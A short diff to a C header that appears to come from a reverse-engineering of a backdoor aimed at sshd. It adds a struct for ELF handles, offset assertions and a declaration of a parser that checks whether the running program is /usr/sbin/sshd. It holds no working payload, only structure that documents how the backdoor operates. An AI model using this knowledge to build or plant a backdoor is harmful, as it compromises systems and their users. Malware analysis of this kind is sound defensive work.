@@ -534,6 +534,17 @@ assert_offset(elf_handles_t, main, 0x0);
 assert_offset(elf_handles_t, libcrypto, 0x8);
 assert_offset(elf_handles_t, libc, 0x10);
 
+typedef struct __attribute__((packed)) {
+	elf_handles_t *handles;
+	Elf64_Ehdr *ehdr;
+	void *__libc_stack_end;
+} main_elf_t;
+
+assert_offset(main_elf_t, handles, 0x0);
+assert_offset(main_elf_t, ehdr, 0x8);
+assert_offset(main_elf_t, __libc_stack_end, 0x10);
+
+
 struct backdoor_data;
 
 /**
@@ -834,6 +845,16 @@ extern BOOL elf_contains_vaddr(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_
  * @return BOOL TRUE if parsing completed successfully, FALSE otherwise
  */
 extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+
+/**
+ * @brief parses the main executable from the provided structure.
+ * as part of the process, argv0 will be retrieved and checked 
+ * to see if it's the expected one (/usr/sbin/sshd)
+ * 
+ * @param main_elf the main executable to parse
+ * @return BOOL TRUE if successful, FALSE otherwise
+ */
+extern BOOL main_elf_parse(main_elf_t *main_elf);
 
 /**
  * @brief Looks up an ELF symbol from a parsed ELF
